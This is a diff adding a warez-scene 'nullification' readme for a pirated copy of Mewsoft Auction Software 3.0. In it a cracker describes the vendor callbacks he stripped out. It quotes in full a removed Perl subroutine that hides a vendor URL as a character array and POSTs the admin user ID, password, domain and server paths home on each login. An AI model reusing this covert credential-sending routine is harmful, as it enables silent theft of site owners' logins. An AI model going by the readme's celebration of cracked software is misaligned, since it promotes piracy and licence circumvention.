@@ -1,0 +1,85 @@
+Mewsoft Software Nullification Information
+-----------------------------------------------------------
+
+#==========================================================
+#                                                   Mewsoft 
+#----------------------------------------------------------
+#   Program Name    : Mewsoft Auction Software
+#   Program Version : 3.0
+#   Program Author  : Elsheshtawy, Ahmed Amin.
+#   Home Page       : http://www.mewsoft.com
+#   Nullified By    : TNO (T)he (N)ameless (O)ne
+#----------------------------------------------------------
+# Copyrights © 2001 Mewsoft. All rights reserved.
+#==========================================================
+
+This software used 4 very basic callback features which have course been removed.
+
+1. The first thing altered was all the links to http://www.mewsoft.com. All these
+   links have now been prefixed with https://www.safeweb.com/o/_i: which means you
+   can safely click through to the vendors website without risking your ip/domain
+   showing up in any of their refer logs.
+
+2. Secondly 3 of the scripts were calling on a total of 4 images from the vendors
+   website. Now rather then have the images called through safeweb I have directed
+   them to be called from your local image directory instead. There is no need for
+   you to obtain these offending images as they have already been downloaded and
+   are packaged with this nullified distribution.
+
+3. Thirdly, when clicking "upgrade" in your Admistration Control Panel the following
+   information was sent to mewsoft and pre-entered into their upgrade form:
+
+   a) Your FTP Domain Name/IP
+   b) The Absolute Path To Your CGI Directory
+   c) The URL To Your CGI Directory
+   d) The Absolute Path To Your HTML Directory
+   e) The URL To Your HTML Directory
+   f) Your Server Path To Perl
+   g) The Software To Install
+   h) The Installation Type
+
+   All this information with the exceptions of f, g and h (which are harmless) have now
+   been changed to "Data Submission Blocked By: TNO". This is to ensure that mewsoft 
+   know nothing of your configurations if you ever decide to go to their upgrade site.
+
+4. Finally, and the scariest of them all the following code has been removed:
+
+   sub s{my($p,$o,$u);my(@h)=('h','t','t','p',':','/','/','w','w','w','.','m','e','w','s','o','f','t','.','c','o','m','/','c','g','i','-','b','i','n','/','u','p','g','r','a','d','e','/','u','s','e','r','s','.','c','g','i');$u=join("", @h);$p=qq!action=User_xi&ID=$Global{'Admin_UserID'}&Pass=$Global{'Admin_Password'}&Domain=$Domain&ProgName=$Global{'MainProg_Name'}&AdminName=$Global{'AdminProg_Name'}&URL= $Script_URL&BaseDir=$Global{'BaseDir'}&CGI_URL=$Global{'CGI_URL'}&HtmlDir=$Global{'HtmlDir'}&HTML_URL=$Global{'HTML_URL'}!;$p=~ s/ /%20/g;eval "use http_lib";($s,$t,$r,$z)=&HTTP_Post($u,$p,"POST");}
+
+   In perl the characters '.' are not counted to be of any significant value so the top
+   part of this code in (-) is actually "http://www.mewsoft.com/cgi-bin/upgrade/users.cgi"
+   The bottom part of this code is the information being recorded by mewsoft and can be
+   translated as follows:
+
+   a) Your Admistration User ID
+   b) Your Administration Password
+   c) Your Domain Name
+   d) The Main Program Name
+   e) The Administrators Name
+   f) The Administrators Program Name
+   g) The URL To Your Administration Script
+   h) Absoloute Path To Your CGI Directory
+   i) The URL Of Your CGI Directory
+   j) Absolute Path To Your HTML Directory
+   k) The URL To Your HTML Directory
+ 
+   This information is not just recorded on installation it is recorded every single time
+   you login to your administration panel. Which means no matter how many times you change
+   your username and password mewsoft will know it and will be able to access your admin
+   panel anytime they like and for those who have used this software they will know that it
+   is capable of storing customers personal details and debit/credit card information!
+
+   This to me is a complete breach of privacy and in most countries against the law. It is
+   a scary thought to think that out of mewsoft's thousands of genuine and paying clients
+   they have global access to every single one of their installations. A scary thought !!!
+
+
+
+  You on the other hand have no worries because if you are reading this then you have in
+  your possesion a 100% fully nullified version that mewsoft will never know about #:)
+
+
+  Enjoy, TNO
+
+--------------End Of Nullification Information-------------
+-----------------------------------------------------------
